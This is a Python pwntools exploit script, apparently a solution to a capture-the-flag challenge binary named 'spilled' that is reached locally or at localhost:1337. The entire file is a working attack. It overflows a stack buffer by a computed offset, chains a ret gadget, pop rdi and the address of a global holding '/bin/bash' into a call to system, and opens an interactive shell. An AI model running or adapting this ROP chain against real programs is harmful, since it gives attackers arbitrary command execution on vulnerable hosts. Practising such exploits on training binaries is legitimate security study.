#!/usr/bin/python3
from pwn import *

context.terminal = ["tmux", "new-window"]
context.arch = "amd64"

binary = "./public/spilled"
elf = ELF(binary)

ssh_en = False
if args.R:
    host = "localhost"
    port = 1337

    if ssh_en:
        user = ""
        password = ""
        r = ssh(user=user, host=host, port=port, password=password)


def start():
    if args.R:
        if not ssh_en:
            return remote(host, port)
        else:
            return r.process(
                binary,
            )

    else:
        gs = """
	    init-pwndbg
        set follow-fork-mode parent
        b *0x4017e3
	    c
	    """
        if args.GDB:
            return gdb.debug(elf.path, gs)
        else:
            return process(elf.path)


def log_addr(name, addr):
    log.info("{}: 0x{:x}".format(name, addr))


io = start()

sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
se = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rl = lambda: io.recvline()
cl = lambda: io.clean()
uu64 = lambda x: u64(x.ljust(8, b"\x00"))

pop_rdi = 0x0000000000401D40
ret = 0x0000000000401016
# Calculate how many bytes we need to send to overflow the buffer
offset = cyclic_find(0x6161616161616164, n=8)
ru(b":\n")
# Write the command we want to execute to the global variable
sl("/bin/bash")
ru(b":\n")

# Call system and provide as argument the command (in the rdi register)
payload = b""
payload += b"a" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(elf.sym.cmd)
payload += p64(elf.sym.system)
sl(payload)
print(payload)

io.interactive()
